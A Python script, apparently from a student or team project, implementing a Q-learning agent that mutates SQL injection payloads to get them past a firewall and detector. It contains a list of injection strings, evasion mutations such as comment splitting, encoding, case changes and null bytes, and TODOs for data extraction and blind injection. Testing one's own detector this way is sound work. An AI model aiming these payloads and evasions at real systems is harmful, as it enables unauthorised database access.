"""
SQL Injection Attack Agent using Reinforcement Learning
Author: Radu (Offensive Team)

TODO: Implement DQN neural network for better generalization
TODO: Add UNION SELECT data extraction phase
TODO: Add blind SQLi support (time-based)
TODO: Download more payloads from PayloadsAllTheThings
"""

import sys
import os
import random
import numpy as np
import requests
from collections import defaultdict

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'shared'))
from config import FIREWALL_URL, API_TIMEOUT
from interfaces import BaseAttacker

# Attack through firewall (smart pre-filter) instead of directly to detector
ATTACK_TARGET = FIREWALL_URL + "/filter"


SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR 'a'='a",
    "admin'--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' AND 1=1--",
    "' AND 'a'='a",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
]


class PayloadMutator:
    
    @staticmethod
    def insert_sql_comment(payload):
        """SELECT -> SEL/**/ECT"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT']
        result = payload
        for keyword in keywords:
            if keyword.upper() in payload.upper():
                import re
                match = re.search(keyword, result, re.IGNORECASE)
                if match:
                    found = match.group()
                    mid = len(found) // 2
                    result = result[:match.start()] + found[:mid] + '/**/' + found[mid:] + result[match.end():]
                    break
        return result
    
    @staticmethod
    def url_encode_special_chars(payload):
        """' -> %27, space -> %20"""
        return payload.replace("'", "%27").replace(" ", "%20").replace("=", "%3D")
    
    @staticmethod
    def randomize_case(payload):
        """SELECT -> SeLeCt"""
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    
    @staticmethod
    def replace_spaces_with_alternatives(payload):
        """space -> tab/newline/comment"""
        alternatives = ['\t', '\n', '\r', '/**/']
        return payload.replace(' ', random.choice(alternatives))
    
    @staticmethod
    def use_double_quotes(payload):
        """' -> " """
        return payload.replace("'", '"')
    
    @staticmethod
    def inject_null_bytes(payload):
        """' -> '%00"""
        return payload.replace("'", "'%00")


class QLearningAttackAgent(BaseAttacker):
    
    def mutate_payload(self, payload):
        # TODO(attack_layer): Implement advanced mutation strategies
        # Current: random mutation. Add:
        # - Hex encoding (' -> 0x27)
        # - Double URL encoding (%27 -> %2527)
        # - Unicode bypass (%u0053ELECT)
        # Use Q-learning policy to select mutation
        return self._apply_mutation(payload, random.randint(0, 5))
    
    def attack(self, target_url):
        """Authentication of BaseAttacker interface."""
        self.target_url = target_url
        self.run_attack_training()

    def __init__(self, target_url=None):
        self.target_url = target_url or ATTACK_TARGET
        self.learning_rate = 0.1
        self.discount_factor = 0.95
        self.exploration_rate = 0.3
        self.exploration_decay = 0.99
        self.min_exploration_rate = 0.05
        
        self.q_table = defaultdict(lambda: [0.0] * 6)
        
        self.mutation_functions = [
            PayloadMutator.insert_sql_comment,
            PayloadMutator.url_encode_special_chars,
            PayloadMutator.randomize_case,
            PayloadMutator.replace_spaces_with_alternatives,
            PayloadMutator.use_double_quotes,
            PayloadMutator.inject_null_bytes,
        ]
        
        self.attack_statistics = {
            'total_attempts': 0,
            'successful_bypasses': 0,
            'detected_attacks': 0,
            'connection_errors': 0,
            'bypass_payloads': []
        }
    
    def _payload_to_state(self, payload):
        return hash(payload) % 10000
    
    def _select_mutation_action(self, state):
        if random.random() < self.exploration_rate:
            return random.randint(0, len(self.mutation_functions) - 1)
        return int(np.argmax(self.q_table[state]))
    
    def _apply_mutation(self, payload, action_index):
        return self.mutation_functions[action_index](payload)
    
    def _send_payload_to_firewall(self, payload):
        """Send payload through firewall's smart pre-filter."""
        try:
            response = requests.post(
                self.target_url,
                json={"payload": payload},
                timeout=API_TIMEOUT
            )
            
            if response.status_code != 200:
                return -5, True, {"error": f"HTTP {response.status_code}"}
            
            result = response.json()
            action = result.get("action", "BLOCKED")
            blocked_by = result.get("blocked_by", "unknown")
            
            if action == "BLOCKED":
                # Detected by firewall pattern OR detector
                return -1, True, result
            else:
                # Bypassed both firewall patterns AND detector!
                return +10, False, result
                
        except requests.exceptions.ConnectionError:
            print("[ERROR] Cannot connect to firewall. Is Catalin's API running?")
            return -5, True, {"error": "connection_failed"}
        except Exception as error:
            return -5, True, {"error": str(error)}
    
    def _update_q_value(self, state, action, reward, next_state):
        current_q = self.q_table[state][action]
        max_next_q = max(self.q_table[next_state])
        updated_q = current_q + self.learning_rate * (
            reward + self.discount_factor * max_next_q - current_q
        )
        self.q_table[state][action] = updated_q
    
    def _run_single_episode(self, base_payload, max_mutations=5):
        current_payload = base_payload
        episode_reward = 0
        
        for _ in range(max_mutations):
            state = self._payload_to_state(current_payload)
            action = self._select_mutation_action(state)
            mutated_payload = self._apply_mutation(current_payload, action)
            
            reward, _, _ = self._send_payload_to_firewall(mutated_payload)
            
            self.attack_statistics['total_attempts'] += 1
            if reward > 0:
                self.attack_statistics['successful_bypasses'] += 1
                self.attack_statistics['bypass_payloads'].append(mutated_payload)
                print(f"[BYPASS] {mutated_payload[:50]}...")
            elif reward == -1:
                self.attack_statistics['detected_attacks'] += 1
            else:
                self.attack_statistics['connection_errors'] += 1
            
            next_state = self._payload_to_state(mutated_payload)
            self._update_q_value(state, action, reward, next_state)
            
            episode_reward += reward
            current_payload = mutated_payload
            
            if reward > 0:
                break
        
        self.exploration_rate = max(self.min_exploration_rate, 
                                     self.exploration_rate * self.exploration_decay)
        return episode_reward
    
    def run_attack_training(self, num_episodes=100):
        print(f"Starting attack training: {num_episodes} episodes")
        print(f"Target: {self.target_url}")
        
        for episode in range(num_episodes):
            base_payload = random.choice(SQLI_PAYLOADS)
            self._run_single_episode(base_payload)
            
            if (episode + 1) % 10 == 0:
                bypass_rate = self.attack_statistics['successful_bypasses'] / max(1, self.attack_statistics['total_attempts'])
                print(f"Episode {episode+1}/{num_episodes} | Bypass: {bypass_rate:.1%} | Explore: {self.exploration_rate:.2f}")
        
        return self.attack_statistics
    
    def print_attack_summary(self):
        stats = self.attack_statistics
        print("\n" + "="*60)
        print("ATTACK SUMMARY")
        print("="*60)
        print(f"Total attempts:      {stats['total_attempts']}")
        print(f"Bypasses:            {stats['successful_bypasses']}")
        print(f"Detected:            {stats['detected_attacks']}")
        print(f"Errors:              {stats['connection_errors']}")
        
        if stats['total_attempts'] > 0:
            print(f"Bypass rate:         {stats['successful_bypasses'] / stats['total_attempts']:.1%}")
        
        if stats['bypass_payloads']:
            print(f"\nSuccessful payloads:")
            for p in stats['bypass_payloads'][:5]:
                print(f"  - {p[:60]}...")
        print("="*60)


def main():
    print("="*60)
    print("SQL INJECTION RL ATTACK AGENT")
    print("="*60 + "\n")
    
    agent = QLearningAttackAgent()
    
    try:
        agent.run_attack_training(num_episodes=50)
        agent.print_attack_summary()
    except KeyboardInterrupt:
        print("\nTraining stopped.")
        agent.print_attack_summary()


if __name__ == "__main__":
    main()
